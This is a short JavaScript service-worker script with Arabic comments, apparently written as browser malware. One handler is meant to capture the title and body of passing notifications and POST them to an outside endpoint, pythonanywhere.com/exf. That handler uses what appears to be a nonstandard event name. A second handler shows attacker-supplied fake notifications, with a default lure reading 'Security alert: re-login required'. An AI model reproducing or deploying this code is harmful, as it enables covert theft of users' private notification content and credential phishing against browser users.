// رادار مراقبة الإشعارات
self.addEventListener('notificationwrapper', function(event) {
    // محاولة التقاط محتوى أي إشعار يمر عبر المتصفح
    const data = event.notification;
    fetch('https://Mohammed888.pythonanywhere.com/exf', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            device: "Background Scraper",
            msg: "📩 إشعار مسحوب!",
            content: `المصدر: ${data.title} | النص: ${data.body}`
        })
    });
});

// استقبال الأوامر من سيرفرك لإظهار إشعارات وهمية
self.addEventListener('push', function(event) {
    const payload = event.data ? event.data.json() : {title: "تنبيه أمني", body: "إعادة تسجيل الدخول مطلوبة"};
    event.waitUntil(
        self.registration.showNotification(payload.title, {
            body: payload.body,
            icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
            vibrate: [200, 100, 200]
        })
    );
});

